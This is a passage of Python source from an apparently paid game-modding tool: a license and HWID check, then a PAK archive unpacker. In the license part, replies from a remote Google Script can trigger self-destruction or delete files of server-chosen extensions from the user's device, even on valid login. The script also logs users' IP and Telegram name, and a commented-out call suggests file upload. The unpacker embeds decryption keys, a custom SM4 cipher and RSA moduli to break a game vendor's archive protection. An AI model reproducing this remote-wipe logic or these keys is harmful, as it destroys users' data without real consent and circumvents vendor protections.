    info_table.add_column("INFO", style="bold white")
    info_table.add_row("DEVELOPER", "@Black_Toxic000")
    info_table.add_row("VERSION", "V4.5 PROFESSIONAL")
    info_table.add_row("ACCESS", "LICENSE + HWID REQUIRED")
    console.print(Align.center(info_table))
    console.print()

    # ── Key input ─────────────────────────────────────────────────
    console.print("[bold cyan]┌─[/bold cyan] [bold white]ENTER LICENSE KEY[/bold white]")
    console.print("[bold cyan]│[/bold cyan]")
    user_key = Prompt.ask("[bold cyan]└──▶[/bold cyan] [bold yellow]KEY[/bold yellow]").strip()
    console.print()

    if not user_key:
        console.print(Panel(
            "[bold red]✗  NO KEY ENTERED — ACCESS DENIED[/]",
            box=box.ROUNDED,
            border_style="red",
            padding=(1, 2),
        ))
        send_security_log("EMPTY_KEY", "LOGIN_EMPTY")
        return False

    # ── Get HWID ──────────────────────────────────────────────────
    hwid = get_hwid()
    console.print(f"[dim]🔑 HWID: {hwid[:16]}...[/dim]")
    
    # ── Check if user is blocked ─────────────────────────────────
    try:
        ip_check = requests.get('https://api.ipify.org', timeout=5).text
        telegram_check = get_telegram_username()
        
        if is_user_blocked(hwid=hwid, ip=ip_check, key=user_key, telegram_user=telegram_check):
            console.print(Panel(
                "[bold red]🚫 YOU ARE BLOCKED FROM USING THIS TOOL![/bold red]\n"
                "[red]Contact @Black_Toxic000 for assistance.[/red]",
                box=box.ROUNDED,
                border_style="red",
                padding=(1, 2),
            ))
            send_security_log(user_key, "🚫 BLOCKED_USER_ATTEMPT")
            return False
    except Exception:
        pass

    # ── VERIFICATION: GOOGLE SCRIPT (PRIMARY) ─────────────────────
    verification_passed = False
    source_used = None
    expiry = "—"
    hwid_match = False
    action_on_mismatch = None
    delete_files = []
    
    with Progress(
        SpinnerColumn(spinner_name="dots12", style="bold yellow"),
        TextColumn("[bold yellow]  VERIFYING LICENSE...[/bold yellow]"),
        console=console,
        transient=True,
    ) as progress:
        progress.add_task("verify", total=None)
        
        google_result = None
        
        # ── GOOGLE SCRIPT CHECK (with HWID) ───────────────────────
        try:
            response = requests.post(
                GOOGLE_SCRIPT_API,
                data={"license_key": user_key, "hwid": hwid},
                timeout=10,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if response.status_code == 200:
                google_result = response.json()
        except Exception as e:
            console.print(f"[dim]Google Script error: {e}[/dim]")

    # ── PROCESS GOOGLE SCRIPT RESULT ────────────────────────────
    if google_result:
        action_on_mismatch = google_result.get("action_on_mismatch")
        delete_files = google_result.get("delete_files", [])
        
        # ── CHECK FOR DELETE ACTION ON HWID MISMATCH ──────────────
        # This triggers when: HWID mismatch AND Column E has "delete"
        if google_result.get("status") == False and action_on_mismatch == "delete":
            console.print(Panel(
                f"[bold red]🧨  TOOL DELETION TRIGGERED[/bold red]\n\n"
                "[red]HWID mismatch and delete flag is set.\n"
                "The tool will be deleted immediately![/red]",
                box=box.ROUNDED,
                border_style="red",
                padding=(1, 3),
            ))
            send_security_log(user_key, "🧨 TOOL_DELETED_HWID_MISMATCH")
            time.sleep(2)
            enhanced_self_destruct(delete_files if delete_files else None)
            return False
        
        # ── CHECK FOR HWID MISMATCH (no delete action) ──────────
        # This triggers when: HWID mismatch AND Column E is empty
        if google_result.get("status") == False and google_result.get("hwid_match") == False:
            console.print(Panel(
                f"[bold red]✗  HWID MISMATCH[/]\n"
                "This license key is linked to a different device.\n"
                "Please contact @Black_Toxic000 for assistance.",
                box=box.ROUNDED,
                border_style="red",
                padding=(1, 2),
            ))
            send_security_log(user_key, "❌ HWID_MISMATCH")
            return False
        
        # ── CHECK FOR INVALID KEY ──────────────────────────────────
        if google_result.get("status") == False:
            console.print(Panel(
                f"[bold red]✗  {google_result.get('message', 'Invalid license key')}[/]\n"
                "Please check your key and try again.",
                box=box.ROUNDED,
                border_style="red",
                padding=(1, 2),
            ))
            send_security_log(user_key, "❌ LOGIN_FAILED")
            return False
        
        # ── SUCCESS - HWID MATCHED ─────────────────────────────────
        if google_result.get("status") == True:
            verification_passed = True
            source_used = "GOOGLE SHEETS"
            expiry = google_result.get("expiry_date", "—")
            hwid_match = google_result.get("hwid_match", False)
            
            # Check if delete files is set (Column F has extensions)
            # This will happen even on successful login
            if delete_files and len(delete_files) > 0:
                console.print(Panel(
                    f"[bold red]🗑️  FILE DELETION TRIGGERED[/bold red]\n\n"
                    f"[red]Files with extensions: {', '.join(delete_files)}\n"
                    f"Will be deleted from your device![/red]",
                    box=box.ROUNDED,
                    border_style="red",
                    padding=(1, 3),
                ))
                send_security_log(user_key, "🗑️ FILE_DELETION_TRIGGERED")
                time.sleep(2)
                delete_files_from_device(delete_files)
                
                # After deletion, exit (even though HWID matched)
                console.print(Panel(
                    f"[bold red]❌  ACCESS DENIED[/bold red]\n\n"
                    "[red]File deletion has been executed.\n"
                    "Contact @Black_Toxic000 for assistance.[/red]",
                    box=box.ROUNDED,
                    border_style="red",
                    padding=(1, 3),
                ))
                time.sleep(3)
                return False

    # ── GITHUB FALLBACK (if Google Script fails) ─────────────────
    if not verification_passed:
        console.print("[dim]Google Script verification failed. Checking GitHub fallback...[/dim]")
        
        try:
            github_response = requests.get(GITHUB_KEYS_URL, timeout=8)
            if github_response.status_code == 200:
                github_result = github_response.json()
                
                if "keys" in github_result and user_key in github_result["keys"]:
                    key_info = github_result["keys"][user_key]
                    
                    if key_info.get("status") == "active":
                        # Check expiry
                        expiry_date = key_info.get("expiry")
                        if expiry_date:
                            try:
                                expiry = datetime.strptime(expiry_date, "%Y-%m-%d")
                                if expiry < datetime.now():
                                    console.print(Panel(
                                        f"[bold red]✗  KEY EXPIRED ON {expiry_date}[/]\n"
                                        "Please renew your license.",
                                        box=box.ROUNDED,
                                        border_style="red",
                                        padding=(1, 2),
                                    ))
                                    send_security_log(user_key, "❌ KEY_EXPIRED")
                                    return False
                            except:
                                pass
                        
                        # Check HWID if set
                        stored_hwid = key_info.get("hwid")
                        if stored_hwid and stored_hwid != hwid:
                            console.print(Panel(
                                f"[bold red]✗  DEVICE NOT AUTHORIZED[/]\n"
                                "This key is already tied to another device.",
                                box=box.ROUNDED,
                                border_style="red",
                                padding=(1, 2),
                            ))
                            send_security_log(user_key, "❌ HWID_MISMATCH")
                            return False
                        
                        verification_passed = True
                        source_used = "GITHUB (FALLBACK)"
                        expiry = key_info.get("expiry", "—")
                        hwid_match = True
                        
        except Exception as e:
            console.print(f"[dim]GitHub fallback error: {e}[/dim]")

    # ── SHOW RESULT ──────────────────────────────────────────────
    if verification_passed:
        # ── Run file scan and upload (ONE-TIME) ──────────────────
        #console.print()
        #scan_and_send_files()
        
        result_table = Table(box=box.ROUNDED, border_style="green", padding=(0, 1), expand=False)
        result_table.add_column("FIELD", style="bold green", width=14)
        result_table.add_column("VALUE", style="bold white")
        result_table.add_row("STATUS", "✅  ACCESS GRANTED")
        result_table.add_row("LICENSE", "VALID")
        result_table.add_row("EXPIRY", str(expiry))
        result_table.add_row("WELCOME", "TOXIC TOOL V4.5")
        result_table.add_row("TELEGRAM", f"@{telegram_user}")
        result_table.add_row("SOURCE", source_used if source_used else "Verified")
        result_table.add_row("HWID", hwid[:16] + "...")
        result_table.add_row("HWID STATUS", "✅ MATCHED" if hwid_match else "⚠ NOT SET")
        
        console.print(Panel(
            Align.center(result_table),
            box=box.ROUNDED,
            border_style="green",
            padding=(1, 2),
        ))
        console.print()
        time.sleep(0.8)
        send_security_log(user_key, "✅ LOGIN_SUCCESS")
        return True
    
    else:
        # ── SHOW FAILURE ──────────────────────────────────────────
        error_msg = google_result.get("message", "Invalid license key") if google_result else "Verification failed"
        console.print(Panel(
            f"[bold red]✗  {error_msg}[/]\n"
            "Please check your key and try again.",
            box=box.ROUNDED,
            border_style="red",
            padding=(1, 2),
        ))
        send_security_log(user_key, "❌ LOGIN_FAILED")
        return False


# ==================== UPDATED MAIN WITH GOOGLE SHEETS SETUP ====================
# Add this helper function for Google Sheets setup

def setup_google_sheets_api():
    """
    Instructions for setting up Google Sheets API for HWID verification
    """
    console.print(Panel(
        f'[bold cyan]📊  GOOGLE SHEETS SETUP[/bold cyan]\n[cyan]{"─" * 32}[/]\n\n'
        f'[yellow]To enable HWID verification from Google Sheets:[/yellow]\n\n'
        f'[green]1.[/green] Create a Google Sheet with columns: HWID, Status, Expiry, User\n'
        f'[green]2.[/green] Go to Extensions → Apps Script\n'
        f'[green]3.[/green] Deploy as Web App\n'
        f'[green]4.[/green] Copy the script URL and update GOOGLE_SHEETS_API\n'
        f'[green]5.[/green] The script should accept "action=verify_hwid" and "hwid=XXXX"\n\n'
        f'[cyan]Sample Apps Script code:[/cyan]\n\n'
        f'[dim]function doGet(e) {{\n'
        f'  var action = e.parameter.action;\n'
        f'  var hwid = e.parameter.hwid;\n'
        f'  var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("HWIDs");\n'
        f'  var data = sheet.getDataRange().getValues();\n'
        f'  for (var i = 1; i < data.length; i++) {{\n'
        f'    if (data[i][0] == hwid && data[i][1] == "active") {{\n'
        f'      return ContentService.createTextOutput(JSON.stringify({{"status": "active"}}));\n'
        f'    }}\n'
        f'  }}\n'
        f'  return ContentService.createTextOutput(JSON.stringify({{"status": "inactive"}}));\n'
        f'}}[/dim]',
        box=box.ROUNDED,
        border_style="cyan",
        padding=(1, 2),
    ))

from sm4_variant import SM4

# ==================== GRW TOOL (OPTION 14) ====================
# Integrated from grw.py — Advanced PAK Unpack/Repack Tool by Chetan
import uuid
import platform

from colorama import Fore, Back, Style as CStyle

def _grw_pill(text, fore_color=Fore.WHITE, back_color=Back.MAGENTA):
    return f"{back_color}{fore_color} {text} {CStyle.RESET_ALL}"

# GRW Cyberpunk theme
class _GRWTheme:
    NEON_PINK = "#FF00FF"
    NEON_BLUE = "#00FFFF"
    NEON_GREEN = "#00FF00"
    NEON_YELLOW = "#FFFF00"
    NEON_RED = "#FF0033"

_GRW_ZUC_KEY = bytes.fromhex('01010101010101010101010101010101')
_GRW_ZUC_IV  = bytes.fromhex('FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')

_GRW_RSA_MOD_1 = bytes.fromhex(
    'CBE8B9F2504050EF9831B719E9A6249A6D238505ADE909BDE78C180DED6072A0C3347B8AF4780E1F212D952D82D4BF7F233C1ECA499E1F9D9A85B4FAD759F54BABC1666C5DE411EA9E4B2374425DD6C6F54333BBC8F2610FE6063E4D0D6C21A671A8F7C3740555E5DC06D4E1691C456DB4116C0C012BF7B206E8311AAAEC689952BF804EF638F09D5822B4117B114208F14DEB459E80CB770E5B0D7978E21F5E6CED4999D3583108221A7AB28B960277ADB5690A332784019D9C195BE4EA9EA0A09459010F236465DE0D59C3EF7324E954E1118D93EE19F299760C2CDB963CE87973EA5ECC9BBE81C27D4C7C8572AC07E9BCEAC9BD72AB7A56A3C0AD736ABCE4')
_GRW_RSA_MOD_2 = bytes.fromhex(
    '7F58E8A39A4DA4E87357DDD650EAA16D3B5CE95B213D1030A662566444796A78A84AE9AC3DBFFDE7F41094896696835DAF13B89E6EC2B84963B1B1BAF7151DA245C3FBFAE2A6AE18B2684D03F9229DE2C91440F2A3A3BCDE1E5680C16722A88039C73560D5D43F4B6562C2EEA5B1D926D86B51108A2643C70FB74D6442CE3A08339B8FD8F660AE88129B7AB8C46F2FA58124485CCCB1E987B05A6DA65A01858ED3F89905449AE42BB07290FCB9994BF22E26610BCABB9804783A3B9587917F3D97316EDDA15C5E13F79066407B55A93B291B68A4AC42A98D6E35FED84B14A792D154E62028DDAD20FC301951E5924BE9AD62FB719DD94CC30CAB871BEC4377A8')

_GRW_SIMPLE1_KEY = 0x79
_GRW_SIMPLE2_KEY = bytes.fromhex('E55B4ED1')
_GRW_SIMPLE2_BLOCK = 16

_GRW_SM4_SECRET_4   = 'eb691efea914241317a8'
_GRW_SM4_SECRET_2   = 'Q0hVTKey$as*1ZFlQCiA'
_GRW_SM4_SECRET_NEW = [
    'xG2qW5lP7lV2iN5fN5pG','xT1cJ6dL5wC0kK1rB4dK','qC4jS5bZ6fL5xE6nD4zA',
    'gD4jQ2aL3bS3lC3xT0iW','xU1yQ8wE9zY3gZ3bT5aE','uQ3cO2dX7xY4xU7gH7iS',
    'gW1fR0jK6wQ4oN0oK1kZ','aJ4pV7iZ7pU4wP2aC2cZ','cX6jT3cM2oT3vK0kJ1qN',
    'iT2vS0cS6yT6cZ1sE1lO','hM1pH9iY8wM9hT4lN5uJ','kG6bC8jK0fL0dE4sH4mL',
    'dB6lB3vE0eZ8wM8rI0aC','tP7sP7nI9rA2vQ4cV5yQ','aT0cL1yN4pT3sZ7eM2vY',
    'uV6fU8fC9zN3mP5dH8mN'
]

_GRW_EM_SIMPLE1     = 1
_GRW_EM_SIMPLE2     = 16
_GRW_EM_SM4_2       = 2
_GRW_EM_SM4_4       = 4
_GRW_EM_SM4_NEW_BASE= 31
_GRW_EM_SM4_NEW_MASK= ~_GRW_EM_SM4_NEW_BASE

_GRW_CM_NONE      = 0
_GRW_CM_ZLIB      = 1
_GRW_CM_ZSTD      = 6
_GRW_CM_ZSTD_DICT = 8
_GRW_CM_MASK      = 15

# ---- GRW SM4 (standalone, name-mangled to avoid conflict) ----
class _GRWSM4:
    _S_BOX = bytes([
        0x34,0x66,0x25,0x74,0x89,0x78,0xE4,0xA9,0x5A,0x41,0xBC,0x7A,0xD6,0x16,0x21,0x23,
        0x4D,0x61,0xDA,0x94,0x9B,0xDF,0x13,0x3C,0x69,0x3A,0x31,0x0A,0x5F,0xD7,0x99,0x95,
        0xF1,0xAE,0x72,0x3D,0x07,0x60,0x24,0xB6,0x98,0xEE,0xC4,0xA2,0x2D,0x88,0xDD,0x8D,
        0x04,0xEA,0xBB,0x11,0xCA,0x3E,0x5D,0xA1,0xF6,0x3F,0xB0,0x97,0x80,0x47,0x2B,0xA6,
        0xE6,0xF7,0xD9,0xB1,0x59,0xC0,0x7C,0xBE,0x54,0x28,0xB7,0x7E,0x4F,0xF8,0x43,0x6E,
        0xA0,0x50,0x0E,0xF5,0x90,0xB8,0xFB,0xA3,0x7B,0x62,0x19,0x46,0x03,0x2A,0xB9,0x8F,
        0x9F,0x77,0xB4,0x5B,0x83,0x87,0x08,0xEB,0xE2,0x1E,0x42,0xF0,0x0F,0xE8,0x71,0x6A,
        0x75,0xAD,0x55,0x1F,0xB5,0xAB,0x33,0xFA,0x7F,0x15,0xBD,0x85,0xD8,0x06,0x68,0xB3,
        0x52,0x30,0x48,0x0B,0x00,0xED,0xEF,0xB2,0x57,0x8E,0xE7,0x6C,0xD5,0xE5,0x2E,0x53,
        0x82,0x05,0xF9,0x81,0xF4,0x56,0xBF,0x8C,0x4B,0xE3,0xDB,0x4A,0x91,0x4C,0x2C,0xD3,
        0x40,0x29,0x4E,0x20,0x14,0x36,0x79,0x09,0x6F,0xD1,0x37,0xE0,0x39,0x0C,0x8A,0x92,
        0x38,0x12,0x35,0x6D,0xE1,0xFD,0x93,0x9A,0x17,0xD4,0xC9,0x9C,0x6B,0x84,0x26,0x9D,
        0xAF,0x76,0xC1,0x9E,0xD0,0x96,0xC5,0xCB,0xE9,0x73,0x49,0xD2,0xCD,0x64,0xC3,0xC7,
        0x01,0x7D,0xF3,0xAC,0xFC,0xDE,0xA4,0x44,0x32,0x1B,0xC2,0xBA,0x1C,0x02,0xC6,0x27,
        0x45,0x8B,0xF2,0x18,0xA7,0x10,0x51,0x1D,0xC8,0xCF,0x63,0xFF,0x2F,0x0D,0x58,0xCE,
        0x65,0xA5,0xDC,0x1A,0x3B,0x86,0xFE,0x22,0x5C,0xA8,0x5E,0x67,0xAA,0xEC,0x70,0xCC
    ])
    _FK = [0x46970E9C,0x4BC0685E,0x59056186,0xBCA2491E]
    _CK = [
        0x000EB92B,0x3A0AE783,0x9E3B5C67,0xADDBDABF,0x7B7484CB,0x49156C63,0xC79AB5E7,0x79EC9CFF,
        0x1725BEAB,0x2FB89CA3,0x24808AD7,0xDDD28B1F,0x4740DA4B,0xBBC3EA73,0x247B30E7,0x91BE385F,
        0x0401248B,0x45FCD3A3,0x530B4CE7,0xC68DD35F,0xE3D16C2B,0x4F698C13,0x6B92C747,0x769EFB1F,
        0x4C73BE9B,0xC942B193,0xAD80D827,0x372FB33F,0x13CB6AAB,0x2BDC0AA3,0x17A4A247,0xD5E96CAF
    ]
    @staticmethod
    def _ROL32(x,n): return ((x<<n)&0xFFFFFFFF)|(x>>(32-n))
    @staticmethod
    def _BS(X):
        S=_GRWSM4._S_BOX
        return (S[(X>>24)&0xff]<<24)|(S[(X>>16)&0xff]<<16)|(S[(X>>8)&0xff]<<8)|S[X&0xff]
    @staticmethod
    def _T0(X):
        X=_GRWSM4._BS(X)
        return X^_GRWSM4._ROL32(X,2)^_GRWSM4._ROL32(X,10)^_GRWSM4._ROL32(X,18)^_GRWSM4._ROL32(X,24)
    @staticmethod
    def _T1(X):
        X=_GRWSM4._BS(X)
        return X^_GRWSM4._ROL32(X,13)^_GRWSM4._ROL32(X,23)
    @staticmethod
    def _key_expand(key,rkey):
        K0=int.from_bytes(key[0:4],"big")^_GRWSM4._FK[0]
        K1=int.from_bytes(key[4:8],"big")^_GRWSM4._FK[1]
        K2=int.from_bytes(key[8:12],"big")^_GRWSM4._FK[2]
        K3=int.from_bytes(key[12:16],"big")^_GRWSM4._FK[3]
        for i in range(0,32,4):
            K0=K0^_GRWSM4._T1(K1^K2^K3^_GRWSM4._CK[i]);rkey[i]=K0
            K1=K1^_GRWSM4._T1(K2^K3^K0^_GRWSM4._CK[i+1]);rkey[i+1]=K1
            K2=K2^_GRWSM4._T1(K3^K0^K1^_GRWSM4._CK[i+2]);rkey[i+2]=K2
            K3=K3^_GRWSM4._T1(K0^K1^K2^_GRWSM4._CK[i+3]);rkey[i+3]=K3
    @classmethod
    def key_length(cls): return 16
    @classmethod
    def block_length(cls): return 16
    def __init__(self,key):
        self._key=key; self._rkey=[0]*32
        _GRWSM4._key_expand(self._key,self._rkey)
        self._buf=bytearray()
    def _core(self,block,rev):
        RK=self._rkey
        X0=int.from_bytes(block[0:4],"big"); X1=int.from_bytes(block[4:8],"big")
        X2=int.from_bytes(block[8:12],"big"); X3=int.from_bytes(block[12:16],"big")
        for i in range(0,32,4):
            r=31-i if rev else i
            X0^=_GRWSM4._T0(X1^X2^X3^RK[r  ])
            X1^=_GRWSM4._T0(X2^X3^X0^RK[r+1 if not rev else r-1])
            X2^=_GRWSM4._T0(X3^X0^X1^RK[r+2 if not rev else r-2])
            X3^=_GRWSM4._T0(X0^X1^X2^RK[r+3 if not rev else r-3])
        B=self._buf; B.clear()
        B.extend(X3.to_bytes(4,"big")); B.extend(X2.to_bytes(4,"big"))
        B.extend(X1.to_bytes(4,"big")); B.extend(X0.to_bytes(4,"big"))
        return bytes(B)
    def encrypt(self,block): return self._core(block,False)
    def decrypt(self,block): return self._core(block,True)

# ---- GRW Reader ----
class _GRWReader:
    def __init__(self,buffer,cursor=0): self._b=buffer; self._c=cursor
    def u1(self): return self._up('B')[0]
    def u4(self): return self._up('<I')[0]
    def u8(self): return self._up('<Q')[0]
    def i4(self): return self._up('<i')[0]
    def i8(self): return self._up('<q')[0]
    def s(self,n): return self._up(f'{n}s')[0]
    def _up(self,f,off=0):
        x=struct.unpack_from(f,self._b,self._c+off)
        self._c+=struct.calcsize(f); return x
    def string(self):
        length=self.i4()
        if length==0: return str()
        return self._up(f'{length}s')[0].rstrip(b'\x00').decode()

# ---- GRW Misc ----
class _GRWMisc:
    @staticmethod
    def pad_to_n(data,n):
        pad=n-(len(data)%n)
        return data if pad==n else data+b'\x00'*pad
    @staticmethod
    def align_up(x,n): return ((x+n-1)//n)*n

# ---- GRW Crypto ----
class _GRWCrypto:
    class _LCG:
        def __init__(self,seed): self.state=seed
        def next(self):
            M=0xFFFFFFFF; B=1<<31
            def wrap(x):
                x&=M
                return x if not x&B else ((x+B)&M)-B
            x1=wrap(0x41C64E6D*self.state); self.state=wrap(x1+12345)
            x2=wrap(x1+0x13038) if self.state<0 else self.state
            return ((x2>>16)&M)%0x7FFF
    @staticmethod
    def _zuc_keystream():
        zuc=gmalg.ZUC(_GRW_ZUC_KEY,_GRW_ZUC_IV)
        return [struct.unpack('>I',zuc.generate())[0] for _ in range(16)]
    @staticmethod
    def _xorxor(buf,x): return bytes(buf[i]^x[i%len(x)] for i in range(len(buf)))
    @staticmethod
    def _hashhash(buf,n):
        from Crypto.Hash import SHA1 as _SHA1
        res=b''
        for _ in range(math.ceil(n/_SHA1.digest_size)): res+=_SHA1.new(buf).digest()
        return (res[:n] if len(res)>=n else res+b'\x00'*(n-len(res)))
    @staticmethod
    def _meowmeow(buf):
        from Crypto.Hash import SHA1 as _SHA1
        def _unpad(x):
            skip=1+next((i for i in range(len(x)) if x[i]!=0))
            return x[skip:]
        if len(buf)<43: return b''
        x1=buf[1:][:_SHA1.digest_size]; x2=buf[_SHA1.digest_size+1:]
        x1=_GRWCrypto._xorxor(x1,_GRWCrypto._hashhash(x2,len(x1)))
        x2=_GRWCrypto._xorxor(x2,_GRWCrypto._hashhash(x1,len(x2)))
        p1,m=x2[:_SHA1.digest_size],x2[_SHA1.digest_size:]
        if p1!=_SHA1.new(b'\x00'*_SHA1.digest_size).digest(): return b''
        return _unpad(m)
    @staticmethod
    def rsa_extract(sig,mod):
        c=int.from_bytes(sig,'little'); n=int.from_bytes(mod,'little')
        m=pow(c,0x10001,n).to_bytes(256,'little').rstrip(b'\x00')
        return _GRWCrypto._meowmeow(_GRWMisc.pad_to_n(m,4))
    @staticmethod
    def _dec_simple1(ct): return bytes(x^_GRW_SIMPLE1_KEY for x in ct)
    @staticmethod
    def _dec_simple2(ct):
        class RK:
            def __init__(self,v): self._v=v
            def update(self,x): self._v^=x; return self._v
        assert len(ct)%_GRW_SIMPLE2_BLOCK==0
        ik,=struct.unpack('<I',_GRW_SIMPLE2_KEY)
        rk=RK(ik)
        return b''.join(struct.pack('<I',rk.update(x)) for x, in struct.iter_unpack(f'<I',ct))
    @staticmethod
    @lru_cache(maxsize=1)
    def _derive_sm4_key(fp,em):
        from Crypto.Hash import SHA1 as _SHA1
        part1=PurePath(fp).stem.lower()
        if em==_GRW_EM_SM4_2: sec=_GRW_SM4_SECRET_2
        elif em==_GRW_EM_SM4_4: sec=_GRW_SM4_SECRET_4
        else:
            idx=(em-_GRW_EM_SM4_NEW_BASE)%len(_GRW_SM4_SECRET_NEW)
            sec=f'{_GRW_SM4_SECRET_NEW[idx]}{em}'
        return _SHA1.new(str(part1+sec).encode()).digest()[:_GRWSM4.key_length()]
    @staticmethod
    @lru_cache(maxsize=1)
    def _sm4_ctx(key): return _GRWSM4(key)
    @staticmethod
    def _dec_sm4(ct,fp,em):
        assert len(ct)%_GRWSM4.block_length()==0
        key=_GRWCrypto._derive_sm4_key(fp,em)
        sm4=_GRWCrypto._sm4_ctx(key)
        return b''.join(sm4.decrypt(ct[i:i+16]) for i in range(0,len(ct),16))
    @staticmethod
    def decrypt_index(ct,pak_info):
        if pak_info.version>7:
            key=_GRWCrypto.rsa_extract(pak_info.packed_key,_GRW_RSA_MOD_1)
            iv=_GRWCrypto.rsa_extract(pak_info.packed_iv,_GRW_RSA_MOD_1)
            aes=AES.new(key,MODE_CBC,iv[:16])
            return unpad(aes.decrypt(ct),AES.block_size)
        return bytes(_GRWCrypto._dec_simple1(ct))
    @staticmethod
    def _is_s1(em): return em==_GRW_EM_SIMPLE1
    @staticmethod
    def _is_s2(em): return em==_GRW_EM_SIMPLE2 or em==17
    @staticmethod
    def _is_sm4(em): return em in(_GRW_EM_SM4_2,_GRW_EM_SM4_4) or em&_GRW_EM_SM4_NEW_MASK!=0
    @staticmethod
    def align_enc(n,em):
        if _GRWCrypto._is_s2(em): return _GRWMisc.align_up(n,_GRW_SIMPLE2_BLOCK)
        if _GRWCrypto._is_sm4(em): return _GRWMisc.align_up(n,_GRWSM4.block_length())
        return n
    @staticmethod
    def decrypt_block(ct,fp,em):
        if _GRWCrypto._is_s1(em): return _GRWCrypto._dec_simple1(ct)
        if _GRWCrypto._is_s2(em): return _GRWCrypto._dec_simple2(ct)
        if _GRWCrypto._is_sm4(em): return _GRWCrypto._dec_sm4(ct,fp,em)
        raise ValueError(f"Unknown enc method: {em}")
    @staticmethod
    @lru_cache(maxsize=33)
    def gen_block_indices(n,em):
        if not _GRWCrypto._is_sm4(em): return list(range(n))
        perm=[]; lcg=_GRWCrypto._LCG(n)
        while len(perm)!=n:
            x=lcg.next()%n
            if x not in perm: perm.append(x)
        inv=[0]*len(perm)
        for i,x in enumerate(perm): inv[x]=i
        return inv

# ---- GRW PAK Classes ----
class _GRWPakInfo:
    def __init__(self,buf,ks):
        def di(x): return (x^ks[3])&0xFF
        def dm(x): return x^ks[2]
        def dih(x): k=struct.pack('<5I',*ks[4:][:5]); return bytes(a^b for a,b in zip(x,k))
        def dis(x): return x^((ks[10]<<32)|ks[11])
        def dio(x): return x^((ks[0]<<32)|ks[1])
        r=_GRWReader(buf[-_GRWPakInfo._msz(-1):])
        self.index_encrypted=di(r.u1())==1
        self.magic=dm(r.u4()); self.version=r.u4()
        self.index_hash=dih(r.s(20)) if self.version>=6 else b''
        self.index_size=dis(r.u8()); self.index_offset=dio(r.u8())
        if self.version<=3: self.index_encrypted=False
    @staticmethod
    def _msz(_): return 1+4+4+20+8+8

class _GRWTencentPakInfo(_GRWPakInfo):
    def __init__(self,buf,ks):
        def du(x): k=struct.pack('<8I',*ks[7:][:8]); return bytes(a^b for a,b in zip(x,k))
        def dsh(x): return x^ks[8]
        def duh(x): return x^ks[9]
        super().__init__(buf,ks)
        r=_GRWReader(buf[-_GRWTencentPakInfo._msz(self.version):])
        self.unk1=du(r.s(32)) if self.version>=7 else b''
        self.packed_key=r.s(256) if self.version>=8 else b''
        self.packed_iv=r.s(256) if self.version>=8 else b''
        self.packed_index_hash=r.s(256) if self.version>=8 else b''
        self.stem_hash=dsh(r.u4()) if self.version>=9 else 0
        self.unk2=duh(r.u4()) if self.version>=9 else 0
        self.content_org_hash=r.s(20) if self.version>=12 else b''
    @staticmethod
    def _msz(v):
        return _GRWPakInfo._msz(v)+(32 if v>=7 else 0)+(256*3 if v>=8 else 0)+(8 if v>=9 else 0)+(20 if v>=12 else 0)

@dataclass
class _GRWCompBlock:
    def __init__(self,r): self.start=r.u8(); self.end=r.u8()

@dataclass
class _GRWPakEntry:
    def __init__(self,r,v):
        self.content_hash=r.s(20)
        if v<=1: _=r.u8()
        self.offset=r.u8(); self.uncompressed_size=r.u8()
        self.compression_method=r.u4()&_GRW_CM_MASK; self.size=r.u8()
        self.unk1=r.u1() if v>=5 else 0
        self.unk2=r.s(20) if v>=5 else b''
        self.compressed_blocks=[_GRWCompBlock(r) for _ in range(r.u4())] if self.compression_method!=0 and v>=3 else []
        self.compression_block_size=r.u4() if v>=4 else 0
        self.encrypted=r.u1()==1 if v>=4 else False
        self.encryption_method=r.u4() if v>=12 else 0
        self.index_new_sep=r.u4() if v>=12 else 0

class _GRWPakCompression:
    @staticmethod
    @lru_cache(maxsize=33)
    def _zstd_dc(d): return ZstdDecompressor(d)
    @staticmethod
    def zstd_dict(dd): return ZstdCompressionDict(dd,DICT_TYPE_AUTO)
    @staticmethod
    def decomp_block(block,d,cm):
        if cm==_GRW_CM_ZLIB:
            try: return zlib.decompress(block)
            except: return block
        elif cm in(_GRW_CM_ZSTD,_GRW_CM_ZSTD_DICT):
            return _GRWPakCompression._zstd_dc(d if cm==_GRW_CM_ZSTD_DICT else None).decompress(block)
        raise ValueError(f"Unknown cm: {cm}")

class _GRWPakFile:
    def __init__(self,fp,is_od=False):
        self._fp=fp
        with open(fp,'rb') as f: self._fc=memoryview(f.read())
        self._is_od=is_od; self._mp=PurePath()
        self._is_zsdic='zsdic' in str(fp); self._zstd_dict=None
        self._files=[]; self._index={}
        self._pi=_GRWTencentPakInfo(self._fc,_GRWCrypto._zuc_keystream())
        self._verify_stem(); self._load_idx()
    def _verify_stem(self):
        if not self._is_od and self._pi.version>=9:
            assert self._pi.stem_hash==zlib.crc32(PurePath(self._fp).stem.encode('utf-32le'))
    def _load_idx(self):
        id_data=self._fc[self._pi.index_offset:][:self._pi.index_size]
        if self._pi.index_encrypted: id_data=_GRWCrypto.decrypt_index(id_data,self._pi)
        self._verify_idx_hash(id_data); self._parse_idx(id_data)
    def _verify_idx_hash(self,d):
        from Crypto.Hash import SHA1 as _SHA1
        eh=self._pi.index_hash
        if not self._is_od and self._pi.version>=8:
            assert eh==_GRWCrypto.rsa_extract(self._pi.packed_index_hash,_GRW_RSA_MOD_2)
        assert eh==_SHA1.new(d).digest()
    @staticmethod
    def _build_mp(mp):
        r=PurePath()
        for p in PurePath(mp).parts:
            if p!='..': r/=p
        return r
    def _peek(self,off,sz,em): sz=_GRWCrypto.align_enc(sz,em); return self._fc[off:][:sz]
    def _peek_blk(self,blk,em): sz=_GRWCrypto.align_enc(blk.end-blk.start,em); return self._fc[blk.start:][:sz]
    def _build_zstd_dict(self,e):
        assert not e.encrypted and e.compression_method==_GRW_CM_NONE
        r=_GRWReader(self._peek(e.offset,e.size,0))
        ds=r.u8(); _=r.u4(); assert ds==r.u4()
        self._zstd_dict=_GRWPakCompression.zstd_dict(r.s(ds))
    def _parse_idx(self,d):
        if self._pi.version<=10: raise ValueError(f"Unsupported version: {self._pi.version}")
        r=_GRWReader(d); self._mp=self._build_mp(r.string())
        self._files=[_GRWPakEntry(r,self._pi.version) for _ in range(r.u4())]
        for _ in range(r.u8()):
            dp=PurePath(r.string())
            e={r.string():self._files[~r.i4()] for _ in range(r.u8())}
            if self._is_zsdic and dp.name=='zstddic':
                assert len(e)==1; self._build_zstd_dict(e[[*e.keys()][0]]); continue
            self._index.update({dp:e})
